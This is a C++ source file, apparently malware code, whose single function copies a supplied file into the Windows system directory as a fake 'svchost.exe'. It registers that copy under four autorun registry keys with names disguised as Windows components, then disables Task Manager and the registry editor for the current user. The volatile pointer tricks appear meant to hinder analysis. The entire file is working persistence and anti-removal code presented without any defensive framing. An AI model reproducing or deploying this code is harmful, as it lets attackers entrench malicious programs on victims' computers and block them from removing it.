#include "data_globals.h"
#pragma optimize("", off)

void Secret(LPCSTR sourceFilePath)
{
    char systemPath[MAX_PATH];
    BYTE enable[4] = {1, 0, 0, 0};

    GetSystemDirectoryA(systemPath, MAX_PATH);

    volatile size_t len_buf[2] = {0, (size_t)0};
    volatile size_t *p_len = (volatile size_t *)&len_buf[0];

    *p_len = strlen(systemPath);
    strcpy(systemPath + *p_len, "\\Generic");
    CreateDirectoryA(systemPath, NULL);

    *p_len = strlen(systemPath);
    strcpy(systemPath + *p_len, "\\svchost.exe");
    CopyFileA(sourceFilePath, systemPath, FALSE);

    volatile HKEY hKey_buf[2] = {NULL, (HKEY)0};
    volatile HKEY *p_hKey = (volatile HKEY *)&hKey_buf[0];

    // Cast away volatile when passing to RegOpenKeyExA (expects PHKEY)
    RegOpenKeyExA(HKEY_LOCAL_MACHINE,
                  "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
                  0, KEY_SET_VALUE, const_cast<PHKEY>(p_hKey));
    RegSetValueExA(*const_cast<HKEY*>(p_hKey), "Generic Host Process for Win32 Services", 0,
                   REG_SZ, (const BYTE*)systemPath, (DWORD)(strlen(systemPath) + 1));
    RegCloseKey(*const_cast<HKEY*>(p_hKey));

    RegOpenKeyExA(HKEY_LOCAL_MACHINE,
                  "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
                  0, KEY_SET_VALUE, const_cast<PHKEY>(p_hKey));
    RegSetValueExA(*const_cast<HKEY*>(p_hKey), "Windows Updater", 0,
                   REG_SZ, (const BYTE*)systemPath, (DWORD)(strlen(systemPath) + 1));
    RegCloseKey(*const_cast<HKEY*>(p_hKey));

    RegOpenKeyExA(HKEY_LOCAL_MACHINE,
                  "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx",
                  0, KEY_SET_VALUE, const_cast<PHKEY>(p_hKey));
    RegSetValueExA(*const_cast<HKEY*>(p_hKey), "Windows Server", 0,
                   REG_SZ, (const BYTE*)systemPath, (DWORD)(strlen(systemPath) + 1));
    RegCloseKey(*const_cast<HKEY*>(p_hKey));

    RegOpenKeyExA(HKEY_LOCAL_MACHINE,
                  "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunServices",
                  0, KEY_SET_VALUE, const_cast<PHKEY>(p_hKey));
    RegSetValueExA(*const_cast<HKEY*>(p_hKey), "Generic", 0,
                   REG_SZ, (const BYTE*)systemPath, (DWORD)(strlen(systemPath) + 1));
    RegCloseKey(*const_cast<HKEY*>(p_hKey));

    RegOpenKeyExA(HKEY_CURRENT_USER,
                  "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
                  0, KEY_SET_VALUE, const_cast<PHKEY>(p_hKey));
    RegSetValueExA(*const_cast<HKEY*>(p_hKey), "DisableTaskMgr", 0,
                   REG_DWORD, enable, sizeof(enable));
    RegCloseKey(*const_cast<HKEY*>(p_hKey));

    RegOpenKeyExA(HKEY_CURRENT_USER,
                  "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
                  0, KEY_SET_VALUE, const_cast<PHKEY>(p_hKey));
    RegSetValueExA(*const_cast<HKEY*>(p_hKey), "DisableRegistrytools", 0,
                   REG_DWORD, enable, sizeof(enable));
    RegCloseKey(*const_cast<HKEY*>(p_hKey));
}

#pragma optimize("", on)
